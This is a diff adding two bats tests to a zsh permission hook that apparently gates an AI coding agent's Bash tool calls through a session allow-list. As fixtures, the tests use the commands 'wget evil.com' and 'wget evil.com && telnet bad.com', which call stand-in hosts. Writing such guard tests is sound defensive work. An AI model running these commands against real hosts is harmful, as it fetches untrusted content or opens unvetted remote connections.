@@ -40,6 +40,29 @@ setup() {
   expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
 }
 
+@test "integration: a binary in the session allow-list is auto-approved" {
+  rtk-command-rewrite() { print -r -- "$1"; }
+  bats_mock rtk-command-rewrite
+
+  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'; sessionAllowListAdd --command wget"
+
+  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
+  [[ "$status" -eq 0 ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
+}
+
+@test "integration: reason only mentions binaries missing from the session allow-list" {
+  rtk-command-rewrite() { print -r -- "$1"; }
+  bats_mock rtk-command-rewrite
+
+  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'; sessionAllowListAdd --command wget"
+
+  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com && telnet bad.com"}}'
+  [[ "$status" -eq 0 ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ telnet ❌'
+}
+
 # --- Mocked tests ---
 
 @test "allow with updatedInput when solkan allows and RTK does not rewrite" {
